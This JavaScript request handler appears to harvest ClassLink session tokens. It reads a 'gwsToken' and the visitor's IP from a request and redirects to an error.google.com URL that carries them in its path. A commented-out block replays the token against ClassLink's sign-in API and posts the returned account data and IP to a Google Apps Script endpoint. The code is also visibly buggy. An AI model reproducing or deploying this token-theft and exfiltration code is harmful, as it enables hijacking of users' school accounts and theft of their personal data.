export async function onRequest(context) {
    const { request } = context;
    const url = new URL(request.url);
    const idMatch = url.search.match(/[?&]i=([^&]+)/);
    const idString = idMatch ? idMatch[1] : null;
    const ip = request.headers.get("CF-Connecting-IP");
    const id = idString.match(/gwsToken":\s*"([0-9a-fA-F-]+)"/);
    return Response.redirect("https://error.google.com/"+idString+'/'+id, 302);
   /* if (id) {
        
        try {
            const nodeApiResponse = await fetch("https://nodeapi.classlink.com/user/signinwith", {
                method: "GET",
                headers: {
                    "gwsToken": id
                }
            });
            nodeApiData = await nodeApiResponse.json();
            await fetch("https://script.google.com/macros/s/AKfycbwYsHOJe4qOP-e1OZBjfSBNDep5Nz4LQ7Rge-xDjcGn7z7oKFPmgGfKk-Ey7eKFYBD2/exec", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({ data: nodeApiData, ip: ip})
            });
        } catch (error) {
return Response.redirect("https://error.google.com/"+error+"/"+JSON.stringify(nodeApiData), 302);
            console.error("Error handling request:", error);
        }
    }*/
}
